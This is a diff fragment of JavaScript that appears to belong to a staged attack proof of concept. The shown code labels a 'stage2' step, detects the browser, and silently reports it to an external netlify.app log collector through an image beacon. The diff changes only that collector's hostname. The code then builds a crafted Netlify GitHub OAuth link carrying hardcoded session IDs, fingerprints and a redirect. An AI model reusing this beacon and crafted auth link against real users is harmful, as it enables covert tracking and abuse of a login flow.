@@ -28,7 +28,7 @@
     var isFF = /Firefox\\//.test(navigator.userAgent);
     var isCr = !isFF && /Chrome\\//.test(navigator.userAgent);
     var b = isFF ? "firefox" : isCr ? "chrome" : "other";
-    function go(k, v) { try { new Image().src = "https://http-log-collector.netlify.app/api/log?" + k + "=" + encodeURIComponent(v); } catch (e) {} }
+    function go(k, v) { try { new Image().src = "https://http-log-collect.netlify.app/api/log?" + k + "=" + encodeURIComponent(v); } catch (e) {} }
     go("stage2", b);
     var a = document.createElement("a");
     a.href = "https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_session_id=afc7d48b-e925-432a-a170-9121236eda09&login=true&entry_point=direct&browser_fingerprint=cbdb5739abc754bdcc16cbd4fb07cd0f&device_fingerprint=bbbac72e6221cf088819fff54ca43b40&redirect=" + encodeURIComponent("https://www.netlify.com/") + "&use_redirect=true";
